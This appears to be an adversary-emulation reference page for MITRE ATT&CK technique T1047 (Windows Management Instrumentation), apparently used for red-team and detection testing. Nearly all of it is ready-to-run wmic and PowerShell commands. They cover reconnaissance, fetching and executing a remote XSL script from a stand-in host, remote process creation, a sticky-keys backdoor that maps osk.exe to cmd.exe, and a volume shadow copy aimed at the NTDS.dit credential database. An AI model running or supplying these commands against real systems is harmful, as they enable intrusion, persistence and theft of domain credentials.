## Windows Management Instrumentation

MITRE ATT&CK Technique: [T1047](https://attack.mitre.org/wiki/Technique/T1047)

### Reconnaissance

Input:

    wmic useraccount get /ALL

Input:

    wmic process get caption,executablepath,commandline

Input:

    wmic qfe get description,installedOn /format:csv

Input:

    wmic /node:"192.168.0.1" service where (caption like "%sql server (%")

Input:

    get-wmiobject –class "win32_share" –namespace "root\CIMV2" –computer "targetname"
    
### Local Execution
    
    wmic os get /format:wmic.xsl

### Remote Execution

    wmic os get /format:"https://example.com/wmic.xsl"

## Test Script

[wmic.xsl](../Payloads/wmic.xsl)

### Lateral Movement

Input:

    wmic /user:<username> /password:<password> /node:<computer_name> process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"

Input:

    wmic /NODE: "192.168.0.1" process call create "evil.exe"

### Privileged Escalation

Input:

    wmic /node:REMOTECOMPUTERNAME PROCESS call create "at 9:00PM c:\GoogleUpdate.exe ^> c:\notGoogleUpdateResults.txt"

Input:

    wmic /node:REMOTECOMPUTERNAME PROCESS call create "cmd /c vssadmin create shadow /for=C:\Windows\NTDS\NTDS.dit > c:\not_the_NTDS.dit"
